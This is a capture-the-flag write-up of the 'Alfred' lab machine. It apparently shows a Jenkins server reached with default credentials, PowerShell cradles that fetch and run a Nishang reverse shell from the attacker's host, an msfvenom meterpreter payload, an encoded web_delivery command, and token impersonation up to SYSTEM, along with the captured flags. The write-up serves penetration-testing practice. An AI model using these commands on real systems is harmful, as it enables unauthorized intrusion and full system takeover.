#Alfred (Jenkins/Nishang)

**Machine info:**
  **- IP: 10.10.179.52**

##Task 1 - Initial Access

#####Question 1 - How many ports are open?

```
──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T5 10.10.179.52                                                                                                                    130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 12:05 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.65% done
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 91.80% done; ETC: 12:05 (0:00:01 remaining)
Nmap scan report for 10.10.179.52
Host is up (0.24s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2020-10-02T14:42:05
|_Not valid after:  2021-04-03T14:42:05
|_ssl-date: 2021-02-23T17:05:59+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds
```

#####Question 2 - What is the username and password for the log in panel(in the format username:password)
Accessing the http://10.10.179.52:80 does not give us much info, but there is the port 8080 which give us the login panel.
Login attempt with the default **admin:admin** enabled access to the dashboard.

#####Question 3 - Find a feature of the tool that allows you to execute commands on the underlying system.
Looking around Jenkins I found the console inside the job/project and clicking on the build history.
Get the Invoke-PowerShellTcp.ps1 script from Nishang (https://github.com/samratashok/nishang).
Create a webserver on VM via python3

```
┌──(kali㉿kali)-[~/Documents/thmalfred]
└─$ sudo python3 -m http.server 8000 
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now add the powershell command given to us to console build section:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.59.146:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.59.146 -Port 9000
```
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9000                                                                                                                                      1 ⨯
listening on [any] 9000 ...
connect to [10.6.59.146] from (UNKNOWN) [10.10.179.52] 49431
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
```

We are inside now :)

#####Question 4 - What is the user.txt flag?
cd into bruce's desktop

```
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt    
```
use command type to get the info inside the txt file

```
PS C:\Users\bruce\Desktop> type user.txt
**79007a09481963edf2e1321abd9ae2a0**
```

##Task 2 - Switching Shells

#####Question 1 - What is the final size of the exe payload that you generated?
Let's create the reverse shell using msfvenom

```
┌──(kali㉿kali)-[~/Documents/thmalfred]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.59.146 LPORT=1234 -f exe -o ReverseShell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: ReverseShell.exe

```
Download the file just like we did in the previous step inside the Build tab

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.59.146:8000/ReverseShell.exe','ReverseShell.exe')"
```

Use multi/handler in metasploit before running the program

```
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.6.59.146 set LPORT 1234
```

Now, on the Terminal tab where we have the port 9000 connection, we use Start-Process ReverseShell.exe to get a connection in the meterpreter tab.
Well, for some reason the meterpreter shell never fully connected, so we need to find another way.. Let's try webdelivery.

```
msf6 exploit(multi/script/web_delivery) > 
```

Let's use the generated code and execute it on target machine

```
PS C:\Program Files (x86)\Jenkins\workspace\project> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABOAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAE4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANgAuADUAOQAuADEANAA2ADoAOQAwADAAMAAvAG0AcgBoAFAAMgB3AGcAVQBJAGgAZgBNAFgALwBpAEMARgBGAGgATQBjAG4AVQB3AEwAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYALgA1ADkALgAxADQANgA6ADkAMAAwADAALwBtAHIAaABQADIAdwBnAFUASQBoAGYATQBYACcAKQApADsA
```

Now that we are in, we are going to migrate to a higher process. First, list the processes with **ps**

```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 620   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 848   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 864   2932  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 916   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 920   620   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 936   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 964   524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1076  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1216  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1244  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1360  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1440  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1468  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1496  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1632  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1752  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1824  1632  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1840  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1856  1824  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 1912  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 2068  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2316  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2340  2932  ReverseShell2.exe     x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\ReverseShell2.exe
 2396  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2560  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2932  1856  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
```

```
meterpreter > migrate 2396
[*] Migrating from 864 to 2396...
[*] Migration completed successfully.
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Let's view all the privileges using whoami /priv

```
PS C:\Users\bruce> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

We are able to exploit two privileges:
  - SeDebugPrivilege
  - SeImpersonatePrivilege 

Now, load incognito and list tokens with the meterpreter session

```
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -g

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\AudioSrv
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CryptSvc
NT SERVICE\CscService
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\Dnscache
NT SERVICE\DPS
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\FontCache
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MMCSS
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\RpcEptMapper
NT SERVICE\RpcSs
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\sppsvc
NT SERVICE\sppuinotify
NT SERVICE\TermService
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\wscsvc
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\ShellHWDetection
```

Impersonate token using the BUILTIN\Administrators

```
meterpreter > impersonate_token "BUILTIN\Administrators"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Now, just read the root.txt file located in C:\Windows\System32\config
```
dff0f748678f280250f25a45b8046b4a
```
